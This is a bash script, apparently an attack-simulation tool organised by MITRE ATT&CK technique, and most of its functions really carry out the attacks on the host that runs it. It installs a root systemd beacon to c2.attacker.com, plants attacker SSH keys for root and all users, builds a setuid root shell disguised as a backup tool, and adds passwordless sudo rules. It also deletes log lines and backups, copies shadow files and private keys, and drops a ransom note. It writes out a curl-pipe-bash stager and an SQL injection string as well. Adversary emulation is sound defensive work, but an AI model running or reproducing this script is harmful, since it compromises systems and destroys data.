#!/bin/bash

# TTP (Tactics, Techniques, and Procedures) Framework
# Based on MITRE ATT&CK Framework for realistic attack simulation

echo "=========================================="
echo "   MITRE ATT&CK TTP SIMULATION FRAMEWORK"
echo "=========================================="

# MITRE ATT&CK Tactic Implementation
# Each function simulates specific ATT&CK techniques

# ===== INITIAL ACCESS (TA0001) =====
initial_access_t1566_001() {
    # T1566.001 - Spearphishing Attachment
    echo "[T1566.001] Spearphishing Attachment"
    mkdir -p /tmp/.email_artifacts
    cat << 'EOF' > /tmp/.email_artifacts/phishing_email.eml
From: hr@company.com
To: victim@company.com
Subject: Urgent: Employee Benefits Update Required
Date: Mon, 7 Oct 2024 14:30:00 +0000
Content-Type: multipart/mixed; boundary="boundary123"

--boundary123
Content-Type: text/html

<html>
<body>
<h2>Employee Benefits System Update</h2>
<p>Dear Employee,</p>
<p>Our HR system requires immediate attention. Please download and run the attached update tool.</p>
<p>Failure to update within 24 hours will result in benefit suspension.</p>
<p>Best regards,<br>HR Department</p>
</body>
</html>

--boundary123
Content-Type: application/octet-stream; name="HR_Benefits_Updater.exe"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="HR_Benefits_Updater.exe"

VGhpcyBpcyBhIHNpbXVsYXRlZCBtYWxpY2lvdXMgYXR0YWNobWVudA==
--boundary123--
EOF

    # Simulate attachment execution
    echo "#!/bin/bash" > /tmp/.email_artifacts/malicious_attachment.sh
    echo "# Simulated malicious attachment payload" >> /tmp/.email_artifacts/malicious_attachment.sh
    echo "curl -s http://c2.attacker.com/stage2 | bash" >> /tmp/.email_artifacts/malicious_attachment.sh
}

initial_access_t1190() {
    # T1190 - Exploit Public-Facing Application
    echo "[T1190] Exploit Public-Facing Application"
    logger "nginx: 203.0.113.42 - - [07/Oct/2024:14:30:00 +0000] \"GET /admin/login.php?user=admin' OR '1'='1-- HTTP/1.1\" 200"
    logger "nginx: SQL injection attempt detected from 203.0.113.42"
    logger "nginx: Authentication bypass successful for admin user"
}

# ===== PERSISTENCE (TA0003) =====
persistence_t1543_002() {
    # T1543.002 - Systemd Service
    echo "[T1543.002] Create Systemd Service"
    cat << 'EOF' > /etc/systemd/system/network-manager-helper.service
[Unit]
Description=Network Manager Helper Service
After=network.target
StartLimitInterval=0

[Service]
Type=simple
ExecStart=/usr/local/bin/net-helper
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
EOF

    cat << 'EOF' > /usr/local/bin/net-helper
#!/bin/bash
while true; do
    curl -s http://c2.attacker.com/beacon -d "host=$(hostname)&user=$(whoami)" 2>/dev/null || true
    sleep 3600
done
EOF
    chmod +x /usr/local/bin/net-helper
    systemctl enable network-manager-helper.service 2>/dev/null || true
}

persistence_t1098_004() {
    # T1098.004 - SSH Authorized Keys
    echo "[T1098.004] SSH Authorized Keys"
    mkdir -p /root/.ssh
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... attacker@malicious-host" >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
    
    # Also add to user accounts
    for user_home in /home/*; do
        if [ -d "$user_home" ]; then
            mkdir -p "$user_home/.ssh"
            echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... attacker@malicious-host" >> "$user_home/.ssh/authorized_keys"
            chmod 600 "$user_home/.ssh/authorized_keys"
        fi
    done
}

# ===== PRIVILEGE ESCALATION (TA0004) =====
privilege_escalation_t1548_001() {
    # T1548.001 - Setuid and Setgid
    echo "[T1548.001] Setuid and Setgid"
    cat << 'EOF' > /tmp/privesc.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
    gcc /tmp/privesc.c -o /usr/local/bin/system-backup 2>/dev/null || echo "GCC not available"
    chmod 4755 /usr/local/bin/system-backup 2>/dev/null || true
    rm -f /tmp/privesc.c
}

privilege_escalation_t1548_003() {
    # T1548.003 - Sudo and Sudo Caching
    echo "[T1548.003] Sudo and Sudo Caching"
    echo "webadmin ALL=(ALL) NOPASSWD:/bin/systemctl" >> /etc/sudoers
    echo "dbuser ALL=(ALL) NOPASSWD:/usr/bin/vim" >> /etc/sudoers
}

# ===== DEFENSE EVASION (TA0005) =====
defense_evasion_t1070_002() {
    # T1070.002 - Clear Linux or Mac System Logs
    echo "[T1070.002] Clear System Logs"
    # Clear specific entries instead of entire logs
    sed -i '/203\.0\.113\.42/d' /var/log/nginx/access.log 2>/dev/null || true
    sed -i '/Failed password/d' /var/log/auth.log 2>/dev/null || true
    sed -i '/sudo.*COMMAND/d' /var/log/auth.log 2>/dev/null || true
    
    # Inject legitimate-looking entries
    logger "systemd[1]: Started Update UTMP about System Runlevel Changes."
    logger "systemd[1]: Reached target Graphical Interface."
}

defense_evasion_t1070_006() {
    # T1070.006 - Timestomp
    echo "[T1070.006] Timestomp"
    # Modify timestamps of malicious files to look legitimate
    touch -t 202301150800.00 /usr/local/bin/net-helper 2>/dev/null || true
    touch -t 202301150800.00 /usr/local/bin/system-backup 2>/dev/null || true
    touch -t 202301150800.00 /etc/systemd/system/network-manager-helper.service 2>/dev/null || true
}

# ===== CREDENTIAL ACCESS (TA0006) =====
credential_access_t1003_008() {
    # T1003.008 - /etc/passwd and /etc/shadow
    echo "[T1003.008] /etc/passwd and /etc/shadow"
    mkdir -p /tmp/.creds
    cp /etc/passwd /tmp/.creds/passwd.backup 2>/dev/null || true
    cp /etc/shadow /tmp/.creds/shadow.backup 2>/dev/null || true
    
    # Simulate credential extraction
    cat << 'EOF' > /tmp/.creds/extracted_hashes.txt
root:$6$rounds=656000$YQKx.jFzX8GFQlxn$Wd3QfgzwqGUPF0srJn5v3VXjBaG5QPiLf5A0jI8LQCzYfN0JlFy/J.DQwY9dF6T4L5N3dUGzYPm7QwJ8vF2Lm0
webadmin:$6$rounds=656000$salt123$hashvalue456
dbuser:$6$rounds=656000$anothersalt$anotherhash
EOF
}

credential_access_t1552_004() {
    # T1552.004 - Private Keys
    echo "[T1552.004] Private Keys"
    mkdir -p /tmp/.keys
    find /home -name "id_rsa" -type f 2>/dev/null | while read key; do
        cp "$key" /tmp/.keys/ 2>/dev/null || true
    done
    
    find /home -name "*.pem" -type f 2>/dev/null | while read key; do
        cp "$key" /tmp/.keys/ 2>/dev/null || true
    done
}

# ===== DISCOVERY (TA0007) =====
discovery_t1018() {
    # T1018 - Remote System Discovery
    echo "[T1018] Remote System Discovery"
    mkdir -p /tmp/.discovery
    cat << 'EOF' > /tmp/.discovery/network_scan.txt
# Network Discovery Results
192.168.1.1     gateway.local           ICMP Reply, SSH (22)
192.168.1.10    dc01.domain.local       TCP 53,88,135,389,445,636 (Domain Controller)
192.168.1.15    file01.domain.local     TCP 22,135,445 (File Server)
192.168.1.20    db01.domain.local       TCP 1433,3306,5432 (Database Server)
192.168.1.25    web01.domain.local      TCP 80,443,8080 (Web Server)
192.168.1.30    backup01.domain.local   TCP 22,873 (Backup Server)
EOF

    # Simulate ping sweep
    for i in {1..10}; do
        logger "kernel: TCP: SYN flood detected from 192.168.1.$(shuf -i 100-200 -n 1)"
    done
}

discovery_t1046() {
    # T1046 - Network Service Scanning
    echo "[T1046] Network Service Scanning"
    cat << 'EOF' > /tmp/.discovery/port_scan.txt
# Port Scan Results
Target: 192.168.1.10
22/tcp   open  ssh      OpenSSH 8.2p1
53/tcp   open  domain   ISC BIND 9.16.1
88/tcp   open  kerberos MIT Kerberos
135/tcp  open  msrpc    Microsoft Windows RPC
389/tcp  open  ldap     Microsoft Windows Active Directory LDAP
445/tcp  open  smb      Microsoft Windows SMB
636/tcp  open  ldaps    Microsoft Windows Active Directory LDAPS

Target: 192.168.1.20
22/tcp   open  ssh      OpenSSH 8.2p1
1433/tcp open  mssql    Microsoft SQL Server 2019
3306/tcp open  mysql    MySQL 8.0.25
5432/tcp open  postgres PostgreSQL 13.3
EOF
}

# ===== LATERAL MOVEMENT (TA0008) =====
lateral_movement_t1021_001() {
    # T1021.001 - Remote Desktop Protocol
    echo "[T1021.001] Remote Desktop Protocol"
    logger "systemd-logind[123]: New session 45 of user administrator."
    logger "systemd-logind[123]: Session 45 logged out. Waiting for processes to exit."
    
    # Simulate RDP connection logs
    for i in {1..5}; do
        logger "sshd[$(shuf -i 2000-9999 -n 1)]: Accepted password for administrator from 192.168.1.$(shuf -i 10-30 -n 1) port 22 ssh2"
    done
}

lateral_movement_t1021_004() {
    # T1021.004 - SSH
    echo "[T1021.004] SSH"
    cat << 'EOF' > /tmp/.lateral/ssh_connections.txt
# SSH Lateral Movement Log
2024-10-07 15:30:12 - SSH connection to 192.168.1.15 as webadmin (success)
2024-10-07 15:32:45 - SSH connection to 192.168.1.20 as dbadmin (success)
2024-10-07 15:35:21 - SSH connection to 192.168.1.25 as root (success)
2024-10-07 15:38:09 - SSH connection to 192.168.1.30 as backup (success)

Commands executed on remote hosts:
192.168.1.15: whoami, id, cat /etc/passwd, find / -name "*.sql"
192.168.1.20: ps aux, netstat -tulpn, mysqldump --all-databases
192.168.1.25: systemctl status apache2, cat /var/log/apache2/access.log
192.168.1.30: ls -la /backup/, tar -czf /tmp/backup.tar.gz /backup/
EOF
}

# ===== EXFILTRATION (TA0010) =====
exfiltration_t1041() {
    # T1041 - Exfiltration Over C2 Channel
    echo "[T1041] Exfiltration Over C2 Channel"
    mkdir -p /tmp/.exfil
    cat << 'EOF' > /tmp/.exfil/c2_communications.txt
# C2 Exfiltration Log
2024-10-07 16:00:12 - POST /upload - customer_db.sql (15.2 MB)
2024-10-07 16:05:34 - POST /upload - employee_records.csv (3.1 MB)
2024-10-07 16:08:21 - POST /upload - financial_reports.xlsx (7.8 MB)
2024-10-07 16:12:45 - POST /upload - source_code.tar.gz (45.3 MB)

C2 Server: http://c2.attacker.com:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Encryption: AES-256-CBC
Total Exfiltrated: 71.4 MB
EOF
}

exfiltration_t1052_001() {
    # T1052.001 - Exfiltration over USB
    echo "[T1052.001] Exfiltration over USB"
    # Simulate USB device insertion
    logger "kernel: usb 1-2: new high-speed USB device number 3 using ehci-hcd"
    logger "kernel: usb 1-2: New USB device found, idVendor=0781, idProduct=5567"
    logger "kernel: usb 1-2: Product: Cruzer Blade"
    
    mkdir -p /media/usb_device
    cat << 'EOF' > /tmp/.exfil/usb_transfer.txt
# USB Exfiltration Log
Device: SanDisk Cruzer Blade (16GB)
Mount Point: /media/usb_device
Files Copied:
- /home/webadmin/Documents/sensitive_data.zip (125 MB)
- /tmp/.creds/extracted_hashes.txt (2.3 KB)
- /var/log/auth.log (15.7 MB)
- /etc/passwd (1.8 KB)
- /home/dbuser/database_backup.sql (89.2 MB)

Total Size: 230.1 MB
Transfer Time: 4 minutes 32 seconds
Timestamp: 2024-10-07 16:25:00
EOF
}

# ===== IMPACT (TA0040) =====
impact_t1486() {
    # T1486 - Data Encrypted for Impact
    echo "[T1486] Data Encrypted for Impact"
    mkdir -p /tmp/.ransomware
    
    # Simulate file encryption
    for file in /home/webadmin/Documents/* 2>/dev/null; do
        if [ -f "$file" ]; then
            echo "ENCRYPTED_BY_RANSOMWARE" > "${file}.locked" 2>/dev/null || true
        fi
    done
    
    # Ransom note
    cat << 'EOF' > /home/webadmin/Desktop/README_DECRYPT.txt
╔═══════════════════════════════════════════════════════════════╗
║                         CRYPTOLOCKER                         ║
║                    YOUR FILES ARE ENCRYPTED                  ║
╚═══════════════════════════════════════════════════════════════╝

What happened to your files?
All your important files have been encrypted with strong encryption.

How to decrypt your files?
You need to purchase our decryption software.

Payment: 0.5 Bitcoin to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
Contact: decrypt@darkweb.onion

You have 72 hours to pay or files will be deleted forever.
EOF
}

impact_t1490() {
    # T1490 - Inhibit System Recovery
    echo "[T1490] Inhibit System Recovery"
    # Delete shadow copies and backups
    rm -rf /var/backups/* 2>/dev/null || true
    rm -rf /backup/* 2>/dev/null || true
    
    cat << 'EOF' > /tmp/.ransomware/shadow_deletion.txt
# Shadow Copy Deletion Log
Deleted backup locations:
- /var/backups/database_backups/
- /backup/daily/
- /backup/weekly/
- /backup/monthly/
- /home/*/backup/
- /tmp/backup*

Recovery inhibition commands executed:
- vssadmin delete shadows /all /quiet
- wbadmin delete catalog -quiet
- bcdedit /set {default} bootstatuspolicy ignoreallfailures
- bcdedit /set {default} recoveryenabled no
EOF
}

# Main TTP execution function
execute_ttp() {
    local tactic="$1"
    local technique="$2"
    
    echo "Executing MITRE ATT&CK Technique: $technique"
    
    case "$technique" in
        "T1566.001") initial_access_t1566_001 ;;
        "T1190") initial_access_t1190 ;;
        "T1543.002") persistence_t1543_002 ;;
        "T1098.004") persistence_t1098_004 ;;
        "T1548.001") privilege_escalation_t1548_001 ;;
        "T1548.003") privilege_escalation_t1548_003 ;;
        "T1070.002") defense_evasion_t1070_002 ;;
        "T1070.006") defense_evasion_t1070_006 ;;
        "T1003.008") credential_access_t1003_008 ;;
        "T1552.004") credential_access_t1552_004 ;;
        "T1018") discovery_t1018 ;;
        "T1046") discovery_t1046 ;;
        "T1021.001") lateral_movement_t1021_001 ;;
        "T1021.004") lateral_movement_t1021_004 ;;
        "T1041") exfiltration_t1041 ;;
        "T1052.001") exfiltration_t1052_001 ;;
        "T1486") impact_t1486 ;;
        "T1490") impact_t1490 ;;
        *) echo "Unknown technique: $technique" ;;
    esac
}

# Execute full ATT&CK chain
execute_attack_chain() {
    echo "Executing full MITRE ATT&CK chain simulation..."
    echo ""
    
    # Create necessary directories
    mkdir -p /tmp/.{email_artifacts,creds,keys,discovery,lateral,exfil,ransomware}
    
    echo "=== INITIAL ACCESS ==="
    execute_ttp "TA0001" "T1566.001"
    execute_ttp "TA0001" "T1190"
    
    echo ""
    echo "=== PERSISTENCE ==="
    execute_ttp "TA0003" "T1543.002"
    execute_ttp "TA0003" "T1098.004"
    
    echo ""
    echo "=== PRIVILEGE ESCALATION ==="
    execute_ttp "TA0004" "T1548.001"
    execute_ttp "TA0004" "T1548.003"
    
    echo ""
    echo "=== DEFENSE EVASION ==="
    execute_ttp "TA0005" "T1070.002"
    execute_ttp "TA0005" "T1070.006"
    
    echo ""
    echo "=== CREDENTIAL ACCESS ==="
    execute_ttp "TA0006" "T1003.008"
    execute_ttp "TA0006" "T1552.004"
    
    echo ""
    echo "=== DISCOVERY ==="
    execute_ttp "TA0007" "T1018"
    execute_ttp "TA0007" "T1046"
    
    echo ""
    echo "=== LATERAL MOVEMENT ==="
    execute_ttp "TA0008" "T1021.001"
    execute_ttp "TA0008" "T1021.004"
    
    echo ""
    echo "=== EXFILTRATION ==="
    execute_ttp "TA0010" "T1041"
    execute_ttp "TA0010" "T1052.001"
    
    echo ""
    echo "=== IMPACT ==="
    execute_ttp "TA0040" "T1486"
    execute_ttp "TA0040" "T1490"
    
    echo ""
    echo "MITRE ATT&CK simulation complete!"
    echo "Techniques executed: 18"
    echo "Tactics covered: 8"
}

# Main execution
if [ "$1" == "full" ]; then
    execute_attack_chain
elif [ "$1" == "technique" ] && [ -n "$2" ]; then
    execute_ttp "" "$2"
else
    echo "Usage:"
    echo "  $0 full                    - Execute full ATT&CK chain"
    echo "  $0 technique <T-ID>        - Execute specific technique"
    echo ""
    echo "Available techniques:"
    echo "  T1566.001, T1190, T1543.002, T1098.004, T1548.001, T1548.003"
    echo "  T1070.002, T1070.006, T1003.008, T1552.004, T1018, T1046"
    echo "  T1021.001, T1021.004, T1041, T1052.001, T1486, T1490"
fi